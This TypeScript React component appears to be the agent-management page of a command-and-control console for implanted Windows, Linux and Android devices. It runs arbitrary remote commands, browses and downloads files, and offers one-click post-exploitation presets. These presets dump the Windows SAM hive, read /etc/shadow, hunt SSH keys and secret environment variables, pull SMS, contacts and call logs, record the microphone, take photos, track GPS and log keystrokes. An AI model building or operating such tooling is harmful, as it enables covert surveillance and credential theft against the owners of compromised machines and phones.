import { useState, useCallback } from 'react'
import { useAPI, apiPost, apiDelete, apiFetch } from '../hooks/useAPI'
import type { Session, Beacon } from '../types'
import {
  Crosshair, RefreshCw, Terminal, Send, Skull, FolderOpen,
  Loader, ChevronDown, ChevronUp, Copy, CheckCheck, X,
  Monitor, Radio, Filter, Search, Download, Shield,
  Smartphone, AlertTriangle, Clock, Activity, Package,
  Zap, Key, MessageSquare, Camera, Mic, Globe,
} from 'lucide-react'

// ─── Unified Agent type ───────────────────────────────────────────────────────

interface Agent {
  id:             string
  name:           string
  hostname:       string
  username:       string
  os:             string
  arch:           string
  transport:      string
  remote_address: string
  pid:            number
  last_checkin:   number   // unix ms or seconds
  is_dead?:       boolean
  kind:           'session' | 'beacon'
  interval?:      number   // beacon only
  next_checkin?:  number   // beacon only
}

interface ExecResult { stdout: string; stderr: string; exit_code: number }
interface FileInfo   { name: string; is_dir: boolean; size: number; mod_time: number }
interface LsResp     { path: string; files: FileInfo[] }

// ─── OS icon / color ─────────────────────────────────────────────────────────

function osIcon(os: string) {
  const o = os?.toLowerCase() ?? ''
  if (o.includes('windows')) return { icon: '🪟', color: '#00d4ff' }
  if (o.includes('android')) return { icon: '🤖', color: '#00ff88' }
  if (o.includes('macos') || o.includes('darwin')) return { icon: '🍎', color: '#aaaacc' }
  return { icon: '🐧', color: '#00ff88' }
}

function checkinAgo(ts: number) {
  const s = Math.floor((Date.now() / 1000) - (ts > 1e10 ? ts / 1000 : ts))
  if (s < 60)  return { label: `${s}s`, color: 'text-primary' }
  if (s < 300) return { label: `${Math.floor(s/60)}m`, color: 'text-warn' }
  return { label: `${Math.floor(s/60)}m`, color: 'text-danger' }
}

function fmtBytes(b: number) {
  if (b >= 1 << 20) return `${(b/(1<<20)).toFixed(1)}M`
  if (b >= 1024)    return `${(b/1024).toFixed(1)}K`
  return `${b}B`
}

// joinPath: construct child path using the correct separator for the OS.
function joinPath(base: string, name: string, isWin: boolean): string {
  const sep  = isWin ? '\\' : '/'
  const clean = base.replace(/[/\\]+$/, '')  // strip trailing sep
  return clean + sep + name
}

// parentPath: navigate up one directory level, handling both separators.
function parentPath(p: string): string {
  const clean = p.replace(/[/\\]+$/, '')
  const idx   = Math.max(clean.lastIndexOf('/'), clean.lastIndexOf('\\'))
  if (idx <= 0) return p.startsWith('\\\\') ? '\\\\' : (isNaN(parseInt(clean[0])) ? '/' : clean.slice(0, 3))
  return clean.slice(0, idx) || '/'
}

// ─── Quick commands by OS ─────────────────────────────────────────────────────

const QUICK_WIN = [
  { l:'whoami',      c:'cmd.exe /c whoami /all' },
  { l:'hostname',    c:'cmd.exe /c hostname' },
  { l:'ipconfig',    c:'cmd.exe /c ipconfig /all' },
  { l:'tasklist',    c:'cmd.exe /c tasklist' },
  { l:'netstat',     c:'cmd.exe /c netstat -ano' },
  { l:'systeminfo',  c:'cmd.exe /c systeminfo' },
  { l:'net user',    c:'cmd.exe /c net user' },
  { l:'env',         c:'cmd.exe /c set' },
]
const QUICK_ANDROID = [
  { l:'id',          c:'id' },
  { l:'device',      c:'getprop ro.product.model && getprop ro.build.version.release' },
  { l:'storage',     c:'df -h /sdcard 2>/dev/null' },
  { l:'battery',     c:'dumpsys battery 2>/dev/null | head -10' },
  { l:'wifi',        c:"dumpsys wifi 2>/dev/null | grep -E 'SSID|IP address' | head -10" },
  { l:'accounts',    c:"dumpsys account 2>/dev/null | grep 'Account {' | head -10" },
  { l:'apps',        c:'pm list packages -3 2>/dev/null | wc -l && echo user apps' },
  { l:'sms',         c:'content query --uri content://sms/inbox --projection address:body:date 2>/dev/null | head -40 || echo no-perm' },
]
const QUICK_UNIX = [
  { l:'id',          c:'id' },
  { l:'uname',       c:'uname -a' },
  { l:'ip addr',     c:'ip addr show' },
  { l:'ps aux',      c:'ps aux | head -30' },
  { l:'ss -tulpn',   c:'ss -tulpn 2>/dev/null || netstat -tulpn' },
  { l:'/etc/passwd', c:'cat /etc/passwd' },
  { l:'sudo -l',     c:'sudo -l 2>&1' },
  { l:'env',         c:'env' },
]

// ─── Component ────────────────────────────────────────────────────────────────

interface Props { onOpenTerminal: (id: string, name: string) => void }

export default function Agents({ onOpenTerminal }: Props) {
  const { data: sessions, refresh: rS } = useAPI<Session[]>('/api/sessions', 5_000)
  const { data: beacons,  refresh: rB } = useAPI<Beacon[]>('/api/beacons',   8_000)

  function refresh() { rS(); rB() }

  // ── Build unified agent list ─────────────────────────────────────────────
  const agents: Agent[] = [
    ...(sessions ?? []).map(s => ({
      ...s, kind: 'session' as const,
    })),
    ...(beacons ?? []).map(b => ({
      ...b, kind: 'beacon' as const,
      last_checkin: b.last_checkin,
      next_checkin: b.next_checkin,
      interval:     b.interval,
      is_dead:      false,
      pid:          0,
    })),
  ]

  // ── UI state ─────────────────────────────────────────────────────────────
  const [filter,    setFilter]    = useState<'all' | 'session' | 'beacon' | 'android'>('all')
  const [search,    setSearch]    = useState('')
  const [expanded,  setExpanded]  = useState<string | null>(null)
  const [activeTab, setActiveTab] = useState<string>('execute')

  // Per-agent execute state
  const [executing,  setExecuting]  = useState<string | null>(null)
  const [execResults,setExecResults]= useState<Record<string, Array<{cmd:string;out:string;ok:boolean}>>>({})
  const [customCmd,  setCustomCmd]  = useState<Record<string, string>>({})
  const [copied,     setCopied]     = useState<string | null>(null)

  // File browser state
  const [fsPath,    setFsPath]    = useState<Record<string, string>>({})
  const [fsData,    setFsData]    = useState<Record<string, LsResp>>({})
  const [fsLoading, setFsLoading] = useState<string | null>(null)

  // Kill state
  const [killing,   setKilling]   = useState<string | null>(null)

  // ── Apply filter + search ────────────────────────────────────────────────
  const visible = agents.filter(a => {
    if (filter === 'session' && a.kind !== 'session') return false
    if (filter === 'beacon'  && a.kind !== 'beacon')  return false
    if (filter === 'android' && !a.os?.toLowerCase().includes('android')) return false
    if (search) {
      const q = search.toLowerCase()
      return a.name.toLowerCase().includes(q) ||
             a.hostname.toLowerCase().includes(q) ||
             a.username.toLowerCase().includes(q) ||
             a.os.toLowerCase().includes(q)
    }
    return true
  })

  // ── Execute ──────────────────────────────────────────────────────────────
  async function execSession(id: string, cmd: string, label?: string) {
    setExecuting(id)
    try {
      const r = await apiPost<ExecResult>(`/api/sessions/${id}/execute`, { command: cmd })
      const out = (r.stdout || r.stderr || '(no output)').slice(0, 4000)
      setExecResults(prev => ({
        ...prev,
        [id]: [{ cmd: label ?? cmd.slice(0,50), out, ok: r.exit_code === 0 }, ...(prev[id] ?? [])].slice(0, 15)
      }))
    } catch(e) {
      setExecResults(prev => ({
        ...prev,
        [id]: [{ cmd: label ?? cmd.slice(0,50), out: String(e), ok: false }, ...(prev[id] ?? [])].slice(0, 15)
      }))
    } finally { setExecuting(null) }
  }

  // ── File browser ─────────────────────────────────────────────────────────
  async function browseFs(id: string, path: string) {
    setFsLoading(id)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${id}/ls?path=${encodeURIComponent(path)}`)
      setFsPath(prev => ({ ...prev, [id]: ls.path }))
      setFsData(prev => ({ ...prev, [id]: ls }))
    } catch(e) {
      execSession(id, `ls -la "${path}"`, `ls ${path}`)
    } finally { setFsLoading(null) }
  }

  function downloadFile(id: string, path: string) {
    window.open(`/api/sessions/${id}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  // ── Kill ─────────────────────────────────────────────────────────────────
  async function killAgent(a: Agent) {
    if (!confirm(`Kill ${a.kind} "${a.name}"?`)) return
    setKilling(a.id)
    try {
      if (a.kind === 'session') await apiDelete(`/api/sessions/${a.id}/kill`)
      setExpanded(null)
    } catch {}
    finally { setKilling(null); refresh() }
  }

  return (
    <div className="flex flex-col gap-3 h-full">

      {/* ── Header ─────────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between shrink-0">
        <div className="flex items-center gap-3">
          <h2 className="text-[#ff4444] font-bold text-lg flex items-center gap-2">
            <Crosshair size={18} /> Agents
            <span className="text-muted text-sm font-normal">({agents.length})</span>
          </h2>
          {/* Filter pills */}
          <div className="flex gap-1">
            {(['all','session','beacon','android'] as const).map(f => (
              <button key={f} onClick={() => setFilter(f)}
                className={`px-2.5 py-1 rounded-full text-[10px] border transition-colors ${
                  filter === f
                    ? 'bg-[#ff4444]/20 border-[#ff4444]/50 text-[#ff4444]'
                    : 'border-border text-muted hover:border-muted'
                }`}>
                {f === 'all'     ? `All (${agents.length})` :
                 f === 'session' ? `Sessions (${agents.filter(a=>a.kind==='session').length})` :
                 f === 'beacon'  ? `Beacons (${agents.filter(a=>a.kind==='beacon').length})` :
                 `Android (${agents.filter(a=>a.os?.toLowerCase().includes('android')).length})`}
              </button>
            ))}
          </div>
        </div>
        <div className="flex items-center gap-2">
          {/* Search */}
          <div className="relative">
            <Search size={11} className="absolute left-2 top-1/2 -translate-y-1/2 text-muted" />
            <input value={search} onChange={e => setSearch(e.target.value)}
              placeholder="Search agents…"
              className="bg-bg border border-border rounded pl-6 pr-2 py-1 text-[11px] text-text placeholder-muted focus:border-primary/50 outline-none w-36" />
          </div>
          <button onClick={refresh}
            className="flex items-center gap-1 text-muted hover:text-text text-[11px] px-2 py-1 rounded border border-border">
            <RefreshCw size={11} /> Refresh
          </button>
        </div>
      </div>

      {/* ── Empty state ─────────────────────────────────────────────────── */}
      {agents.length === 0 && (
        <div className="flex-1 flex flex-col items-center justify-center gap-3 text-center">
          <Crosshair size={40} className="text-border" />
          <p className="text-muted text-sm">No active agents.</p>
          <p className="text-muted text-xs">Start a listener and deploy an implant to see agents here.</p>
        </div>
      )}

      {/* ── Agent table ─────────────────────────────────────────────────── */}
      {agents.length > 0 && (
        <div className="flex-1 min-h-0 overflow-y-auto flex flex-col gap-1.5">

          {/* Table header */}
          <div className="grid text-[9px] text-muted uppercase tracking-widest px-4 py-1.5 border-b border-border/50 shrink-0"
            style={{ gridTemplateColumns: '14px 1fr 140px 140px 80px 80px 60px 80px auto' }}>
            <span />
            <span>Name</span>
            <span>User @ Host</span>
            <span>OS</span>
            <span>Transport</span>
            <span>Last check-in</span>
            <span>Type</span>
            <span>PID</span>
            <span>Actions</span>
          </div>

          {visible.map(a => {
            const { icon: osIco, color: osCol } = osIcon(a.os)
            const { label: ago, color: agoCol } = checkinAgo(a.last_checkin)
            const isExp   = expanded === a.id
            const isAndroid = a.os?.toLowerCase().includes('android')
            const isWin     = a.os?.toLowerCase().includes('windows')
            const quick     = isAndroid ? QUICK_ANDROID : isWin ? QUICK_WIN : QUICK_UNIX
            const myResults = execResults[a.id] ?? []
            const isExec    = executing === a.id

            return (
              <div key={a.id}
                className={`rounded-lg border bg-surface transition-all ${
                  a.is_dead
                    ? 'border-danger/20 opacity-60'
                    : isExp
                    ? 'border-[#ff4444]/30 bg-[#ff444408]'
                    : 'border-border hover:border-border/80'
                }`}>

                {/* ── Row ──────────────────────────────────────────────── */}
                <div className="grid items-center px-4 py-2.5 cursor-pointer select-none gap-2"
                  style={{ gridTemplateColumns: '14px 1fr 140px 140px 80px 80px 60px 80px auto' }}
                  onClick={() => { setExpanded(isExp ? null : a.id); setActiveTab('execute') }}>

                  {/* Status dot */}
                  <span className={`w-2 h-2 rounded-full ${
                    a.is_dead ? 'bg-danger' : 'bg-primary animate-pulse'
                  }`} />

                  {/* Name */}
                  <div className="flex items-center gap-2 min-w-0">
                    <span className="text-text text-xs font-bold truncate">{a.name}</span>
                    <span className="text-muted text-[9px] font-mono hidden lg:inline">{a.id.slice(0,8)}</span>
                  </div>

                  {/* User@Host */}
                  <div className="min-w-0">
                    <span className="text-accent text-[11px] truncate block">{a.username}</span>
                    <span className="text-muted text-[10px] truncate block">{a.hostname}</span>
                  </div>

                  {/* OS */}
                  <div className="flex items-center gap-1.5 min-w-0">
                    <span className="text-sm">{osIco}</span>
                    <span className="text-[10px] truncate" style={{ color: osCol }}>
                      {a.os}/{a.arch}
                    </span>
                  </div>

                  {/* Transport */}
                  <span className="text-[10px] text-muted truncate">{a.transport}</span>

                  {/* Last check-in */}
                  <span className={`text-[11px] font-semibold ${agoCol}`}>{ago}</span>

                  {/* Type badge */}
                  <span className={`text-[9px] px-1.5 py-0.5 rounded font-semibold w-fit ${
                    a.kind === 'session'
                      ? 'bg-primary/15 text-primary'
                      : 'bg-warn/15 text-warn'
                  }`}>
                    {a.kind === 'session' ? 'SESSION' : 'BEACON'}
                  </span>

                  {/* PID */}
                  <span className="text-[10px] text-muted">{a.pid || '—'}</span>

                  {/* Quick actions (row level) */}
                  <div className="flex items-center gap-1" onClick={e => e.stopPropagation()}>
                    {a.kind === 'session' && (
                      <button onClick={() => onOpenTerminal(a.id, a.name)}
                        title="Open Shell"
                        className="p-1.5 rounded border border-primary/30 text-primary hover:bg-primary/10 transition-colors">
                        <Terminal size={12} />
                      </button>
                    )}
                    <button
                      onClick={() => { setExpanded(isExp ? null : a.id); setActiveTab('files') }}
                      title="Files"
                      className="p-1.5 rounded border border-warn/30 text-warn hover:bg-warn/10 transition-colors">
                      <FolderOpen size={12} />
                    </button>
                    <button
                      onClick={() => killAgent(a)}
                      disabled={!!killing}
                      title="Kill"
                      className="p-1.5 rounded border border-danger/30 text-danger hover:bg-danger/10 transition-colors disabled:opacity-40">
                      {killing === a.id ? <Loader size={12} className="animate-spin" /> : <Skull size={12} />}
                    </button>
                    <button onClick={() => { setExpanded(isExp ? null : a.id) }}
                      className="p-1.5 text-muted hover:text-text transition-colors">
                      {isExp ? <ChevronUp size={12} /> : <ChevronDown size={12} />}
                    </button>
                  </div>
                </div>

                {/* ── Expanded interaction panel ──────────────────────── */}
                {isExp && a.kind === 'session' && (
                  <div className="border-t border-border/40 px-4 py-3 flex flex-col gap-3">

                    {/* Tab bar */}
                    <div className="flex gap-0.5 bg-bg/50 p-1 rounded-lg border border-border/40 overflow-x-auto">
                      {[
                        { id:'execute', label:'⚡ Execute' },
                        { id:'files',   label:'📁 Files'   },
                        ...(isAndroid ? [
                          { id:'comms',   label:'💬 Comms'  },
                          { id:'network', label:'🌐 Network'},
                          { id:'apps',    label:'📦 Apps'   },
                          { id:'specops', label:'🚀 Ops'    },
                        ] : [
                          { id:'recon',   label:'🔍 Recon'  },
                        ]),
                      ].map(t => (
                        <button key={t.id} onClick={() => setActiveTab(t.id)}
                          className={`px-3 py-1.5 rounded text-[10px] whitespace-nowrap transition-colors ${
                            activeTab === t.id
                              ? 'bg-[#ff4444]/20 text-[#ff4444] font-semibold'
                              : 'text-muted hover:text-text'
                          }`}>
                          {t.label}
                        </button>
                      ))}
                    </div>

                    {/* EXECUTE tab */}
                    {activeTab === 'execute' && (
                      <div className="flex flex-col gap-2">
                        <div className="flex flex-wrap gap-1.5">
                          {quick.map(q => (
                            <button key={q.l} onClick={() => execSession(a.id, q.c, q.l)} disabled={isExec}
                              className="px-2.5 py-1 rounded text-[10px] border border-border text-muted hover:border-[#ff4444]/50 hover:text-[#ff4444] transition-colors disabled:opacity-40 font-mono">
                              {q.l}
                            </button>
                          ))}
                        </div>
                        <div className="flex gap-2">
                          <input value={customCmd[a.id] ?? ''} disabled={isExec}
                            onChange={e => setCustomCmd(p => ({ ...p, [a.id]: e.target.value }))}
                            onKeyDown={e => {
                              if (e.key === 'Enter' && customCmd[a.id]?.trim()) {
                                execSession(a.id, customCmd[a.id])
                                setCustomCmd(p => ({ ...p, [a.id]: '' }))
                              }
                            }}
                            placeholder={isAndroid ? 'Android command…' : isWin ? 'cmd.exe /c ...' : 'command…'}
                            className="flex-1 bg-bg border border-border rounded px-3 py-2 text-xs font-mono text-text placeholder-muted focus:border-[#ff4444]/50 outline-none" />
                          <button
                            onClick={() => {
                              if (customCmd[a.id]?.trim()) {
                                execSession(a.id, customCmd[a.id])
                                setCustomCmd(p => ({ ...p, [a.id]: '' }))
                              }
                            }}
                            disabled={isExec || !customCmd[a.id]?.trim()}
                            className="px-3 py-2 rounded bg-[#ff4444]/10 border border-[#ff4444]/30 text-[#ff4444] hover:bg-[#ff4444]/20 disabled:opacity-40">
                            {isExec ? <Loader size={13} className="animate-spin" /> : <Send size={13} />}
                          </button>
                        </div>
                      </div>
                    )}

                    {/* FILES tab */}
                    {activeTab === 'files' && (
                      <div className="flex flex-col gap-2">
                        {/* Path bar */}
                        <div className="flex items-center gap-2">
                          <input value={fsPath[a.id] ?? (isAndroid ? '/sdcard' : isWin ? 'C:\\' : '/')}
                            onChange={e => setFsPath(p => ({ ...p, [a.id]: e.target.value }))}
                            onKeyDown={e => e.key === 'Enter' && browseFs(a.id, fsPath[a.id] ?? '/')}
                            className="flex-1 bg-bg border border-border rounded px-2 py-1.5 text-[11px] font-mono text-text focus:border-warn outline-none" />
                          <button onClick={() => browseFs(a.id, fsPath[a.id] ?? '/')} disabled={!!fsLoading}
                            className="px-3 py-1.5 rounded bg-warn/10 border border-warn/40 text-warn text-[11px] disabled:opacity-40">
                            {fsLoading === a.id ? <Loader size={11} className="animate-spin" /> : 'Go'}
                          </button>
                          {/* Quick shortcuts */}
                          {isAndroid && ['/', '/sdcard', '/sdcard/Download', '/sdcard/DCIM', '~'].map(p => (
                            <button key={p} onClick={() => { setFsPath(prev => ({...prev,[a.id]:p})); browseFs(a.id, p) }}
                              className="px-2 py-1.5 rounded border border-border text-muted text-[9px] hover:border-warn hover:text-warn transition-colors">
                              {p.split('/').pop() || p}
                            </button>
                          ))}
                          {isWin && ['C:\\', 'C:\\Users', 'C:\\Windows\\System32'].map(p => (
                            <button key={p} onClick={() => { setFsPath(prev => ({...prev,[a.id]:p})); browseFs(a.id, p) }}
                              className="px-2 py-1.5 rounded border border-border text-muted text-[9px] hover:border-warn hover:text-warn transition-colors">
                              {p.split('\\').pop() || p}
                            </button>
                          ))}
                        </div>

                        {/* File list */}
                        {fsData[a.id] && (
                          <div className="border border-border rounded-lg overflow-hidden max-h-52 overflow-y-auto">
                            {/* Go up */}
                            <button onClick={() => browseFs(a.id, parentPath(fsData[a.id].path))}
                              className="w-full flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/40 text-[11px] text-muted">
                              ⬆ ..
                            </button>
                            {/* Filter out . and .. directory references from OS */}
                            {fsData[a.id].files.filter(f => f.name !== '.' && f.name !== '..').map(f => (
                              <div key={f.name}
                                className="flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/20 group text-[11px]">
                                <span>{f.is_dir ? '📁' : '📄'}</span>
                                <button
                                  onClick={() => f.is_dir && browseFs(a.id, joinPath(fsData[a.id].path, f.name, isWin))}
                                  className={`flex-1 font-mono text-left truncate ${f.is_dir ? 'text-warn hover:text-primary cursor-pointer' : 'text-text'}`}>
                                  {f.name}
                                </button>
                                <span className="text-[9px] text-muted shrink-0">
                                  {f.is_dir ? 'dir' : fmtBytes(f.size)}
                                </span>
                                {!f.is_dir && (
                                  <button
                                    onClick={() => downloadFile(a.id, joinPath(fsData[a.id].path, f.name, isWin))}
                                    title={`Download ${f.name}`}
                                    className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[9px] border border-primary/30 text-primary hover:bg-primary/10 transition-colors shrink-0">
                                    <Download size={9} /> DL
                                  </button>
                                )}
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    )}

                    {/* COMMS tab (Android) */}
                    {activeTab === 'comms' && isAndroid && (
                      <div className="flex flex-wrap gap-1.5">
                        {[
                          { l:'SMS Inbox',   c:"content query --uri content://sms/inbox --projection address:body:date 2>/dev/null | head -80" },
                          { l:'SMS Sent',    c:"content query --uri content://sms/sent --projection address:body:date 2>/dev/null | head -80" },
                          { l:'All SMS',     c:"content query --uri content://sms --projection address:body:date:type 2>/dev/null | head -100" },
                          { l:'Contacts',    c:"content query --uri content://contacts/phones/ --projection display_name:number 2>/dev/null | head -100" },
                          { l:'Call Log',    c:"content query --uri content://call_log/calls --projection number:date:type:duration 2>/dev/null | head -60" },
                          { l:'Clipboard',   c:"termux-clipboard-get 2>/dev/null || echo no-api" },
                        ].map(q => (
                          <button key={q.l} onClick={() => execSession(a.id, q.c, q.l)} disabled={isExec}
                            className="px-2.5 py-1.5 rounded text-[10px] border border-accent/40 text-accent hover:bg-accent/10 transition-colors disabled:opacity-40">
                            {q.l}
                          </button>
                        ))}
                      </div>
                    )}

                    {/* NETWORK tab */}
                    {activeTab === 'network' && (
                      <div className="flex flex-wrap gap-1.5">
                        {(isAndroid ? [
                          { l:'WiFi Info',      c:"dumpsys wifi 2>/dev/null | grep -E 'SSID|IP address|DNS' | head -20 || ip addr" },
                          { l:'Saved Networks', c:"dumpsys wifi 2>/dev/null | grep -E 'WifiConfiguration|SSID' | head -40" },
                          { l:'IP Addr',        c:'ip addr show 2>/dev/null' },
                          { l:'DNS',            c:"getprop net.dns1; getprop net.dns2" },
                        ] : [
                          { l:'ip addr',    c:'ip addr show' },
                          { l:'ip route',   c:'ip route show' },
                          { l:'ss -tulpn',  c:'ss -tulpn 2>/dev/null || netstat -tulpn' },
                          { l:'DNS',        c:'cat /etc/resolv.conf' },
                          { l:'/etc/hosts', c:'cat /etc/hosts' },
                        ]).map(q => (
                          <button key={q.l} onClick={() => execSession(a.id, q.c, q.l)} disabled={isExec}
                            className="px-2.5 py-1.5 rounded text-[10px] border border-primary/40 text-primary hover:bg-primary/10 transition-colors disabled:opacity-40">
                            {q.l}
                          </button>
                        ))}
                      </div>
                    )}

                    {/* APPS tab (Android) */}
                    {activeTab === 'apps' && isAndroid && (
                      <div className="flex flex-wrap gap-1.5">
                        {[
                          { l:'User Apps',     c:'pm list packages -3 2>/dev/null' },
                          { l:'All Apps',      c:'pm list packages 2>/dev/null' },
                          { l:'Running Svcs',  c:'dumpsys activity services 2>/dev/null | grep "^  \\*" | head -30' },
                          { l:'Recent Apps',   c:'dumpsys activity recents 2>/dev/null | grep "Recent #" | head -20' },
                        ].map(q => (
                          <button key={q.l} onClick={() => execSession(a.id, q.c, q.l)} disabled={isExec}
                            className="px-2.5 py-1.5 rounded text-[10px] border border-warn/40 text-warn hover:bg-warn/10 transition-colors disabled:opacity-40">
                            {q.l}
                          </button>
                        ))}
                      </div>
                    )}

                    {/* RECON tab (non-Android) */}
                    {activeTab === 'recon' && !isAndroid && (
                      <div className="flex flex-wrap gap-1.5">
                        {(isWin ? [
                          { l:'whoami /all',    c:'cmd.exe /c whoami /all' },
                          { l:'systeminfo',     c:'cmd.exe /c systeminfo' },
                          { l:'net localgroup', c:'cmd.exe /c net localgroup administrators' },
                          { l:'tasklist',       c:'cmd.exe /c tasklist' },
                          { l:'netstat -ano',   c:'cmd.exe /c netstat -ano' },
                          { l:'reg SAM',        c:'cmd.exe /c reg save hklm\\sam C:\\Temp\\sam.bak 2>&1' },
                          { l:'scheduled tasks',c:'cmd.exe /c schtasks /query /fo list' },
                          { l:'services',       c:'cmd.exe /c sc query type= all state= running' },
                        ] : [
                          { l:'id',          c:'id' },
                          { l:'sudo -l',     c:'sudo -l 2>&1' },
                          { l:'passwd',      c:'cat /etc/passwd | grep -v nologin' },
                          { l:'shadow',      c:'cat /etc/shadow 2>/dev/null || echo no-access' },
                          { l:'crontab',     c:'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null' },
                          { l:'suid files',  c:'find / -perm -4000 -type f 2>/dev/null | head -20' },
                          { l:'ssh keys',    c:'find / -name id_rsa -o -name id_ed25519 2>/dev/null | head -10' },
                          { l:'env',         c:'env | grep -iE "pass|token|key|secret|aws|api" | head -20' },
                        ]).map(q => (
                          <button key={q.l} onClick={() => execSession(a.id, q.c, q.l)} disabled={isExec}
                            className="px-2.5 py-1.5 rounded text-[10px] border border-danger/40 text-danger hover:bg-danger/10 transition-colors disabled:opacity-40">
                            {q.l}
                          </button>
                        ))}
                      </div>
                    )}

                    {/* SPEC OPS tab (Android) */}
                    {activeTab === 'specops' && isAndroid && (
                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-1.5">
                        {[
                          { icon:'🎤', l:'Audio (15s)',    c:"command -v termux-microphone-record >/dev/null 2>&1 && termux-microphone-record -l 15 -f /sdcard/Download/audio_$(date +%s).m4a && echo '[+] Saved to /sdcard/Download/' || echo '[!] Install Termux:API from F-Droid then run: pkg install termux-api'" },
                          { icon:'📸', l:'Camera/Screen',  c:"command -v termux-camera-photo >/dev/null 2>&1 && termux-camera-photo /sdcard/Download/photo_$(date +%s).jpg && echo '[+] Photo saved' || (screencap -p /sdcard/Download/ss_$(date +%s).png 2>/dev/null && echo '[+] Screenshot saved to /sdcard/Download/') || echo '[!] Install Termux:API: pkg install termux-api'" },
                          { icon:'📍', l:'GPS Location',   c:"command -v termux-location >/dev/null 2>&1 && termux-location --provider gps 2>/dev/null || (echo '[Network location:]' && dumpsys location 2>/dev/null | grep -E 'mLastLocation|Last Known|Latitude|Longitude|lat=|lng=' | head -10) || echo '[!] Install Termux:API: pkg install termux-api'" },
                          { icon:'🔑', l:'Keylogger',      c:"getevent -l 2>/dev/null | grep KEY | head -50 || cat /proc/bus/input/devices 2>/dev/null | head -30 || echo '[!] Root required for hardware keylogger. Check ~/.bash_history for typed commands'" },
                          { icon:'💾', l:'Full Recon',     c:"echo '[DEVICE]' && getprop ro.product.model && getprop ro.product.manufacturer && getprop ro.build.version.release && echo '[NETWORK]' && ip addr show | grep 'inet ' && getprop net.dns1 && echo '[SIM]' && getprop gsm.operator.alpha && getprop gsm.network.type && echo '[ACCOUNTS]' && dumpsys account 2>/dev/null | grep 'Account {' | head -8 && echo '[STORAGE]' && df -h /sdcard /data 2>/dev/null" },
                          { icon:'🗄️', l:'Cred Files',    c:"echo '[Config files with credentials:]' && find /sdcard /data/data/com.termux -name '*.json' -o -name '*.conf' -o -name '*.env' -o -name '*.key' 2>/dev/null | grep -iE 'auth|token|cred|pass|key|secret|api' | head -25" },
                        ].map(q => (
                          <button key={q.l} onClick={() => execSession(a.id, q.c, q.l)} disabled={isExec}
                            className="flex items-center gap-2 px-2.5 py-2 rounded border border-border bg-bg hover:border-danger/30 hover:bg-danger/5 transition-colors disabled:opacity-40 text-left">
                            <span className="text-base">{q.icon}</span>
                            <span className="text-[10px] text-muted">{q.l}</span>
                          </button>
                        ))}
                      </div>
                    )}

                    {/* ── Output console ─────────────────────────────── */}
                    {myResults.length > 0 && (
                      <div className="border border-border rounded-lg overflow-hidden bg-bg">
                        <div className="flex items-center justify-between px-3 py-1.5 bg-surface border-b border-border text-[10px]">
                          <div className="flex items-center gap-2">
                            <span className={`px-1.5 py-0.5 rounded ${myResults[0].ok ? 'text-primary bg-primary/10' : 'text-danger bg-danger/10'}`}>
                              {myResults[0].ok ? '✓' : '✗'}
                            </span>
                            <span className="text-muted font-mono">{myResults[0].cmd}</span>
                          </div>
                          <div className="flex items-center gap-1.5">
                            <button onClick={() => {
                              navigator.clipboard.writeText(myResults[0].out)
                              setCopied(a.id); setTimeout(() => setCopied(null), 1500)
                            }} className="text-muted hover:text-primary">
                              {copied === a.id ? <CheckCheck size={11} className="text-primary" /> : <Copy size={11} />}
                            </button>
                            <button onClick={() => setExecResults(p => ({ ...p, [a.id]: [] }))} className="text-muted hover:text-danger">
                              <X size={11} />
                            </button>
                          </div>
                        </div>
                        <pre className="px-3 py-2 text-[11px] font-mono text-text overflow-x-auto max-h-52 whitespace-pre-wrap break-all">
                          {myResults[0].out}
                        </pre>
                        {myResults.length > 1 && (
                          <div className="px-3 py-1 text-[9px] text-muted border-t border-border/40">
                            {myResults.length - 1} earlier result{myResults.length > 2 ? 's' : ''} in history
                          </div>
                        )}
                      </div>
                    )}

                    {isExec && (
                      <div className="flex items-center gap-2 text-warn text-xs">
                        <Loader size={11} className="animate-spin" /> Executing on {a.name}…
                      </div>
                    )}
                  </div>
                )}

                {/* Beacon expanded — show task queue info */}
                {isExp && a.kind === 'beacon' && (
                  <div className="border-t border-border/40 px-4 py-3">
                    <div className="flex items-start gap-3 bg-warn/5 border border-warn/20 rounded-lg p-3 text-xs">
                      <Radio size={14} className="text-warn shrink-0 mt-0.5" />
                      <div>
                        <p className="text-warn font-semibold mb-1">Beacon Agent — Async Task Queue</p>
                        <p className="text-muted">Beacons check in on a schedule (interval: {a.interval ? Math.round(a.interval/1000)+'s' : '?'}).</p>
                        <p className="text-muted mt-0.5">Use the <span className="text-warn font-semibold">Beacons</span> tab to queue tasks and view results.</p>
                        {a.next_checkin && (
                          <p className="text-muted mt-1">Next check-in: <span className="text-text">{new Date(a.next_checkin * 1000).toLocaleTimeString()}</span></p>
                        )}
                      </div>
                    </div>
                  </div>
                )}
              </div>
            )
          })}
        </div>
      )}
    </div>
  )
}
